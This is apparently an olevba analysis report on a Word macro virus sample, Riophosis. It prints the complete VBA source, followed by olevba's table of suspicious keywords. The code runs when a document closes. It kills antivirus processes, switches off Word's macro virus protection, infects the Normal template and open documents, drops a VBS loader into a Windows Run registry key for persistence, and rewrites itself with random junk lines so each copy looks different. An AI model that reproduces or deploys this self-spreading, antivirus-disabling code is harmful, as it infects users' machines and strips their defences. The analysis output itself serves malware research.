olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Riophosis-99ada51b6eadff00092ef2ab3f4812c8f5695c0450aaffbb035c79812f2c265d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Riophosis-99ada51b6eadff00092ef2ab3f4812c8f5695c0450aaffbb035c79812f2c265d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_cLOSe()
For Each PROG In Tasks
If InStr(1, UCase(PROG.Name), Chr(78) & Chr(65) & Chr(86)) Then PROG.Close
If InStr(1, UCase(PROG.Name), Chr(65) & Chr(78) & Chr(84) & Chr(73) & Chr(86) & Chr(73) & Chr(82) & Chr(85) & Chr(83)) Then PROG.Close
Next
System.PrivateProfileString("", "HkEy_lOCAl_MAcHINE\sOFtWArE\mICRoSoFT\WinDOWs\CUrREntVErsiOn\rUN\", "nAV AgenT") = ""
BtHHTrrgCfg = 122174.617662907 Or 684237.451576531  '
With Application
GsRJsoKSgDOJ = KdnDIgKFLbcm Eqv JkIAcTdoQCjq '
.DisplayAlerts = wdAlertsNone
knAkPnrKKEAoq = 827472.872572839 And 994670.826922417  '
.EnableCancelKey = wdCancelDisabled
With .Options
tssEF = 951277.318012655 Eqv 844448.675661564  '
.VirusProtection = 0
iKiQe = dpQhH + ehfjp '
.ConfirmConversions = 0
cqerll = 181180.355566442 Xor 668413.924328327  '
KCqFJqFM = cGoGhlEk Eqv EQSAFnpL '
.SaveNormalPrompt = 0
End With
FlEgrQq = 818225.698020279 And 117750.169305682  '
End With
If ThisDocument = ActiveDocument Then Set Target = NormalTemplate
hBNIBQG = bQOIdoQ + NlcADil '
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument
sOurCefilE = Environ$("wIndir") & "\RIoPhOsiS.sys"
bPgDnLFHmsfLM = BGsMnBKIHNCOA And SDkCKgQHOAeOG '
vbSBAcKUP = Environ$("WiNDIR") & "\rIoPhoSiS.vbS"
sAePTc = 115811.9474051 Xor 894975.661324561  '
With ThisDocument.VBProject.VBCoMPoNEnTS(1).CoDEMODuLE
Vcode = UCase(.lInes(1, .counTOfLINES))
qCAoN = 625636.36920172 Eqv 737754.441650033  '
poLY
SEDKjCH = 504292.103014827 Eqv 16033.9314338565  '
jhnpOIpRAPMd = ANCqMromlqAd Or lENLMIqPSCgI '
For CoUNTEr = 1 To Len(Vcode)
HRpkhHO = QpNrFTO Or IopAeKA '
RpIktArbNS = 328312.605132043 - 101529.019869804  '
T = Mid(Vcode, CoUNTEr, 1)
lnctmMeA = gQfIgrdr Xor eAKdLBtA '
TePRiAMd = 808031.287400186 Or 988542.521893501  '
If Asc(T) < 90 And Asc(T) > 65 Then T = Chr(Asc(T) + Int(Rnd * 2) * 32)
KQmeFF = 180638.728700995 Xor 729670.092949569  '
nEWVcoDe = nEWVcoDe & T
Next
smCKf = PJoJN Xor ScRgq '
hmJOimgtEs = 741755.280220449 - 859734.152319431  '
Open sOurCefilE For Output As #1
Print #1, nEWVcoDe
EIoLbqp = 127593.151291609 And 665784.58726269  '
Close #1
dSKlAqn = oqcBFNq - jpADtFI '
Open vbSBAcKUP For Output As #1
Print #1, "ON ErROR RESUMe NExt"
HrKFimqp = nDifMhLQ Or IAhMgAlD '
Print #1, "SeT fSO = creATEoBjEcT(""WOrd.APpLIcAtion"")"
Print #1, "WITH FsO.OpTioNS"
EINAJG = 159508.60523504 Or 314972.562529564  '
Print #1, ".VIruSpRoTeCTioN = 0"
Print #1, ".cONfiRMconvERSIOns = 0"
SkkjEbgi = 341046.349894166 Xor 173984.413207948  '
Print #1, ".SAVEnORmALPrOMpT = 0"
Print #1, ".APpLiCATIOn.DiSPLAYALeRts = wDAlErTSnoNE"
oTkkbLAgMknFG = JhQFTkJgiqOLr Xor SrAPhHsICMTNc '
Print #1, "eND WITh"
gSoIQo = 218727.07190305 Xor 177478.255176902  '
Print #1, "WIth Fso.nOrmAltemplAtE.vbPrOjeCt.vbcoMponenTs(1)"
Print #1, ".CODeMODuLE.DeLeTelINeS 1, .coDEModUlE.COUNtofLINeS"
fiAtbOQH = OOdLPncC And AbfSAGfq '
Print #1, ".cODemodUle.ADdfrOmfILe """ & sOurCefilE & """"
CNkTp = 16658.5278818607 Xor 502983.484347403  '
Print #1, "END wiTh"
jiAoCdd = 817869.381810129 + 970746.976944923  '
Print #1, "fSO.normALTEmPLATE.sAVE"
BALQsS = hGcoes Xor temFBf '
Print #1, "fso.quiT"
hPRDglCF = iBbARsNf Or DpODMbPG '
Close #1
lEJmESFltAI = GiRpipmTIJC Or gsApIhAQLPk '
dHQRBplfmlHmBl = NhLrODJOJTShHN - cTCKbEkMMQMeRK '
RFSTgsltDfLlAA = pirdmQDGbFdTsh - hnQdtCLbgOBmeJ '
AAdqMR = GkEGgj And DjkLHA '
System.PrivateProfileString("", "hkEy_loCAl_MAcHInE\soFtWARe\mIcROsOft\WINDOWS\CURreNtversIon\Run\", "RiOPhosiS") = vbSBAcKUP
jQNICCIMb = drocHSHMG Eqv LABsAtDQo '
QTmgLgmRHe = 953616.023120999 Xor 741058.144992292  '
End With
MKGOBDesbgld = hPAKqKNStiEJ And nTJDoJAnFJjt '
With Target.VBProject.VBCoMPoNEnTS(1).CoDEMODuLE
SEpHfDPjJmSS = JQqQAhgbSoBO Xor cRKkINIsdfGk '
sJiDs = KOSCQ Or lBmAK '
.dEleTelinEs 1, .counTOfLINES
rJsBFQbBiFKlrb = 981709.213831186 And 351969.307358801  '
.AddFromFile sOurCefilE
rDBsrqTDJHBh = cFondgqcTnBP Xor ehpFNTrGgPeM '
End With
lffmkjArH = GQoQMEfIK And sIGOhAoqD '
RAMlrTgAplTE = 755431.492683291 + 38982.173561275  '
End Sub
Private Sub poLY()
With ThisDocument.VBProject.VBCoMPoNEnTS(1).CoDEMODuLE
iRLNt = BsPjg - LGPlr '
For I = 1 To .counTOfLINES
NJRjTCrlsK = 518319.922925591 Xor 186108.462668359  '
A = Int(Rnd * 6) + 1
If A = 1 Then oPeR = Space(1) & "XOR" & Space(1)
ABTmA = SsIPA Eqv simEP '
If A = 2 Then oPeR = Space(1) & "AnD" & Space(1)
THJQBERkICs = lEIRjORcPlh Or pArQEGfDbtJ '
If A = 3 Then oPeR = Space(1) & "oR" & Space(1)
cSjSPGpB = BKsmHkld + AqNFtrDj '
If A = 4 Then oPeR = Space(1) & "+" & Space(1)
PnNsHNMk = SgnsoPSj Xor HOrpiAjn '
If A = 5 Then oPeR = Space(1) & "-" & Space(1)
If A = 6 Then oPeR = Space(1) & "EQv" & Space(1)
LOoCATGOLN = 218693.812544525 - 137661.08098197  '
A = Int(Rnd * 2) + 1
For ii = 1 To 5 + Int(Rnd * 10)
nrLOnqsjeLARD = 146328.89896667 And 160236.973265827  '
jUnk1 = jUnk1 & Chr(Int(Rnd * 20) + 97)
If A = 1 Then junk2 = junk2 & Chr(Int(Rnd * 20) + 97)
jldhKEQ = 172567.671823025 Or 88722.7959321141  '
If A = 2 Then junk2 = Space(1) & Rnd * 999999 & Space(1)
If A = 1 Then JunK3 = JunK3 & Chr(Int(Rnd * 20) + 97)
JQALnPjIEHK = llgsbEBlNJq - iIOgjToBqOk '
jjBcnqg = PdoBtAH - PLnAHnr '
If A = 2 Then JunK3 = Space(1) & Rnd * 999999 & Space(1)
Next
IJQro = RrCEj + TlLkA '
If Right(.lInes(I, 1), Len(I) - 1) = "'" Then .ReplACELIne I, jUnk1 & "=" & junk2 & oPeR & JunK3 & "'"
jUnk1 = ""
BjICqnThtnefh = DfcfAKcGQqSFL - qfiImbTiAoTTS '
junk2 = ""
eplIlllhm = KNrOKngLc Xor NoePGeLtQ '
JunK3 = ""
thhLHL = IPMsgS - ELKfmT '
Next
CEeFPgmjBAR = 464736.354530454 And 531917.576545179  '
End With
kMIlIEEHRjb = SeotDEeBkPF + KJlnrmgkhSB '
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_cLOSe      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|rUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|creATEoBjEcT        |May create an OLE object                     |
|Suspicious|WinDOWs             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCoMPoNEnTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CoDEMODuLE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |rIoPhoSiS.vbS       |Executable file name                         |
|Hex String|gVaV                |67566156                                     |
|Hex String|5UfD                |35556644                                     |
|Hex String|        )IV         |09294956                                     |
|Hex String|Xrbi                |58726269                                     |
|Hex String|V%)V                |56252956                                     |
|Hex String|HCG@                |48434740                                     |
|Hex String|F&h5                |46266835                                     |
|Hex String|5E0E                |35453045                                     |
+----------+--------------------+---------------------------------------------+

